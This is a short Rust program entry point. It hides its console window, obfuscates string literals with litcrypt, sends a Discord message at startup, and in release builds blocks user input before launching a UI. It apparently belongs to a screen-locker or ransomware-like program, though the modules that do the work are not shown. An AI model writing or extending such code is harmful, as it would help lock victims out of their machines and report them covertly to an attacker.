#![windows_subsystem = "windows"]

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

mod disk;
mod interface;
mod windows;
mod discord;


#[tokio::main]
async fn main() -> Result<(), ()> {
    discord::send_message().await;

    #[cfg(not(debug_assertions))] {
        windows::block_input();
        interface::start_ui();
    }
    

    Ok(())
}

